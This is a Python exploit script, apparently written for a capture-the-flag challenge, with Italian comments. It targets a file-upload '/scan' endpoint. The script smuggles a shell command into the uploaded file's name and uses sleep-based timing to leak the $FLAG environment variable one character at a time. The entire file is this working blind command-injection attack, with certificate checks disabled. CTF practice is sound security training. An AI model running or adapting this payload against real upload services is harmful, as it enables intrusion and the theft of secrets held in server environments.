from pwn import *
import requests
import string
import time
import urllib3

urllib3.disable_warnings()

context.log_level = "info"

URL = "https://14a08211-d38e-4434-a5d8-765bf33030c5.offsec.m0lecon.it//scan"

# charset realistico per flag CTF
CHARSET = string.ascii_letters + string.digits + "{}_-"

# sessione persistente
s = requests.Session()

flag = ""

# lunghezza massima stimata flag
MAX_LEN = 80

for pos in range(1, MAX_LEN + 1):

    found = False

    for c in CHARSET:

        payload = (
            f"flag.txt;test $(printf %s $FLAG | cut -c{pos}) = {c} && sleep 3"
        )

        files = {
            "specimen": (
                payload,
                b"aaaa",
                "text/plain"
            )
        }

        start = time.time()

        try:
            r = s.post(
                URL,
                files=files,
                verify=False,
                timeout=10
            )
        except requests.exceptions.ReadTimeout:
            elapsed = 10
        else:
            elapsed = time.time() - start

        log.info(f"pos={pos:02d} char={c} time={elapsed:.2f}")

        # threshold timing
        if elapsed > 2.5:
            flag += c
            log.success(f"FOUND => {flag}")
            found = True
            break

    if not found:
        log.warning("No matching character found, stopping.")
        break

print(f"\nFINAL FLAG: {flag}")
